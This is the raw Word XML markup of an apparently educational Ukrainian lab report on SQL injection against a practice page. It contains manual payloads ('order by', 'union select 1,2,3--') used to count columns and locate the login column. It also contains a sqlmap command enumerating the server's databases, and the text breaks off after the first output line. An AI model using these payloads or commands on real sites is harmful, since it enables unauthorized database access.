            <wp:extent cx="5753100" cy="1079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2-16 at 7.48.3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5706" w14:textId="77777777" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A342B84" w14:textId="2E76327B" w:rsidR="00DE01B3" w:rsidRPr="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Виявлення кількості колонок в таблиці</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6DDAC5" w14:textId="02C7C859" w:rsidR="004B7EE1" w:rsidRDefault="004B7EE1" w:rsidP="004B7EE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial Unicode MS" w:hAnsi="Times New Roman" w:cs="Arial Unicode MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B7EE1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial Unicode MS" w:hAnsi="Times New Roman" w:cs="Arial Unicode MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">При спробі додання до url-адреси </w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>id=1 order by 4</w:t>
      </w:r>
      <w:r w:rsidR="00DE01B3" w:rsidRPr="0058471D">
        <w:t>--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lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> отримуємо</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503377EE" w14:textId="2B941992" w:rsidR="001743F4" w:rsidRDefault="004B7EE1" w:rsidP="004B7EE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial Unicode MS" w:hAnsi="Times New Roman" w:cs="Arial Unicode MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/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lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>помилку на сайті:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA5C8E8" w14:textId="33C869C7" w:rsidR="004B7EE1" w:rsidRDefault="004B7EE1" w:rsidP="004B7EE1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2A8ED002" wp14:editId="03E72E3A">
            <wp:extent cx="5943600" cy="1050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2-16 at 7.51.4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6C76" w14:textId="77777777" w:rsidR="00DE01B3" w:rsidRDefault="004B7EE1" w:rsidP="00DE01B3">
      <w:pPr>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Прочитавши помилку дізнаємося, що у таблиці немає четвертої колонки. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E51AFF" w14:textId="5A912C6C" w:rsidR="004B7EE1" w:rsidRPr="006D0FE8" w:rsidRDefault="004B7EE1" w:rsidP="00DE01B3">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Отже колонок у ній 3 або менше.</w:t>
      </w:r>
      <w:r w:rsidR="006D0FE8">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Слід також зазначити, що знак “--“ вважається коментарем у мові </w:t>
      </w:r>
      <w:r w:rsidR="006D0FE8">
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="006D0FE8">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>. Він доданий до запиту, щоб атака працювала і у випадку не числового параметру запиту.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077B761F" w14:textId="77777777" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="266F4A25" w14:textId="32C128C3" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Спробуємо тепер додати до адреси </w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">=1 </w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>order</w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>by</w:t>
      </w:r>
      <w:r w:rsidRPr="0058471D">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3--.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Маємо:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CED6AF1" w14:textId="7F09CC35" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3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10281A8C" wp14:editId="1874A970">
            <wp:extent cx="5943600" cy="1296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2-16 at 7.57.5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104E" w14:textId="355FAE1C" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3738"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Отже запит коректний, а це означає, що у таблиці, що містить дані користувачів 3 колонки.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516F05E0" w14:textId="77777777" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3738"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B413133" w14:textId="7F094EA9" w:rsidR="00DE01B3" w:rsidRDefault="00DE01B3" w:rsidP="00DE01B3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Виявлення номеру колонки, що відповідає за логін</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231BA122" w14:textId="3D5FFF88" w:rsidR="00DE01B3" w:rsidRDefault="003B1749" w:rsidP="00DE01B3">
      <w:pPr>
        <w:pStyle w:val="Heading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Скористаємося </w:t>
      </w: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-командою </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>union</w:t>
      </w:r>
      <w:r w:rsidRPr="003B1749">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>, що дода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є до поточного запиту додатковий. В даному випадку </w:t>
      </w:r>
      <w:r w:rsidR="00E906C1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">виберемо три стовпці з таблиці (а їх усього 3) командою </w:t>
      </w:r>
      <w:r w:rsidR="00E906C1" w:rsidRPr="00E906C1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E906C1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>select 1,2,3--</w:t>
      </w:r>
      <w:r w:rsidR="00E906C1" w:rsidRPr="00E906C1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C321F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">. Отож наш результуючий запит наступний: </w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">=1 </w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:t>union</w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidR="00C321F1" w:rsidRPr="000B5119">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1,2,3--</w:t>
      </w:r>
      <w:r w:rsidR="00C321F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D2401D7" w14:textId="6E807088" w:rsidR="00C321F1" w:rsidRDefault="00C321F1" w:rsidP="00C321F1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2B90F186" wp14:editId="7CDCAF26">
            <wp:extent cx="5943600" cy="1296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2-16 at 7.57.5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1368" w14:textId="44785A79" w:rsidR="00C321F1" w:rsidRDefault="00C321F1" w:rsidP="00C321F1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2894"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Сайт працює як зазвичай, отже </w:t>
      </w:r>
      <w:r w:rsidR="00167A23">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">запит коректний. Тепер спробуємо </w:t>
      </w:r>
      <w:r w:rsidR="0041144F">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">підставити неіснуючий </w:t>
      </w:r>
      <w:r w:rsidR="0041144F">
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="0041144F">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="0041144F">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">наприклад -1): </w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">=-1 </w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>union</w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidR="0041144F" w:rsidRPr="000B5119">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1,2,3--</w:t>
      </w:r>
      <w:r w:rsidR="0041144F">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>. Тепер наш сайт показує замість логіну користувача номер стовпця, в якому він збер</w:t>
      </w:r>
      <w:r w:rsidR="00D85A29">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>ігається. В даному випадку це другий стовпець:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4770A4D0" w14:textId="725E06DE" w:rsidR="00F42267" w:rsidRDefault="00D85A29" w:rsidP="00D85A29">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2894"/>
        </w:tabs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0504108D" wp14:editId="4838CF3D">
            <wp:extent cx="4166235" cy="88799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2-16 at 8.16.3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856" cy="96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6CE5" w14:textId="52D06860" w:rsidR="00F42267" w:rsidRDefault="00F42267" w:rsidP="002A3325">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Злам за допомогою утил</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">іти </w:t>
      </w:r>
      <w:r w:rsidR="002A3325">
        <w:t>sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E471031" w14:textId="76535DD8" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1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12BBD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Спершу дізнаємося які бази даних є на сервері. Для цього скористаємося командою </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>py</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>https</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>://</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>kushkamisha</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>io</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>hack</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>injection</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>simple</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>=1" --</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>batch</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>dbs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E527AED" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B55C5D2" w14:textId="1744F761" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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Отримали таку інформацію:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B47F3DA" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRPr="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rStyle w:val="s1"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07E7440B" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRPr="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>available</w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="s1"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>databases</w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="s1"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> [6]:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
